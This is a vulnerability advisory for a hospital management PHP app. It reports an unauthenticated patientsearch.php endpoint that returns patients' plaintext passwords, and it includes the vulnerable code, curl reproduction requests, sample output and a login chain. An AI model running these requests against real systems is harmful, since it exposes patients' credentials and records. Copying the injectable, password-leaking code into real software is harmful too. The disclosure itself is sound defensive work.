## Title

`patientsearch.php` returns the plaintext password of any patient in the response

### Summary

The `patientsearch.php` endpoint queries the `patreg` table by contact number and renders the resulting row in an HTML table that includes the `password` column. The endpoint is reachable without authentication and does not redact the password. An attacker who knows (or guesses) a patient's contact number can read the plaintext password and authenticate as that patient.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Exposure of Sensitive Information Through Data Queries (CWE-200)

### Affected Code

File: `patientsearch.php`

```php
$contact=$_POST['patient_contact'];
$query = "select * from patreg where contact= '$contact'";
$result = mysqli_query($con,$query);
$row=mysqli_fetch_array($result);
...
$fname = $row['fname'];
$lname = $row['lname'];
$email = $row['email'];
$contact = $row['contact'];
$password = $row['password'];
echo "<tr>
    <td>$fname</td>
    <td>$lname</td>
    <td>$email</td>
    <td>$contact</td>
    <td>$password</td>
</tr>";
```

### Root Cause

The endpoint selects the entire `*` row and then renders every column, including the secret `password` column. There is no field allowlist and no `htmlspecialchars()` call. The endpoint is also reachable without any session check.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Request the password of a known patient. The endpoint requires no session.

```bash
curl -sS "$BASE_URL/patientsearch.php" \
  --data-urlencode "patient_search_submit=1" \
  --data-urlencode "patient_contact=9876543210" \
  | grep -E "<td>" | head -10
```

```html
<table>
  <thead>
    <tr>
      <th>First Name</th>
      <th>Last Name</th>
      <th>Email</th>
      <th>Contact</th>
      <th>Password</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Ram</td>
      <td>Kumar</td>
      <td>ram@gmail.com</td>
      <td>9876543210</td>
      <td>ram123</td>
    </tr>
  </tbody>
</table>
```

The response contains the plaintext password `ram123` for the patient `Ram Kumar`.

3. Confirm the same value works as the authentication credential:

```bash
curl -sS -i "$BASE_URL/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=ram@gmail.com" \
  --data-urlencode "password2=ram123" | head -10
```

```text
HTTP/1.1 302 Found
Location: admin-panel.php
```

4. The same column is also rendered in the receptionist dashboard (`admin-panel1.php` Patient List tab, line 326: `echo "<tr><td>$pid</td><td>$fname</td><td>$lname</td><td>$gender</td><td>$email</td><td>$contact</td><td>$password</td></tr>";`). The same plaintext password is exposed via the dashboard to anyone who can reach `admin-panel1.php` (which is equally unauthenticated — see CVE-09).

### Impact

`patientsearch.php` returns the plaintext password of every patient in the system. Because the endpoint is reachable without authentication, an attacker can:

- Enumerate patient contact numbers via the receptionist dashboard, the appointment list, or the `myhmsdb.sql` seed file.
- Read the password of any patient by POSTing the contact number to `patientsearch.php`.
- Authenticate as the patient (`func.php`) and pivot to the patient dashboard, which lists the patient's appointments and prescriptions.

Because the same `password` column is also exposed in the receptionist dashboard and the doctor search endpoint, the disclosure spans every user role in the application.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score: 7.5 (High)
```
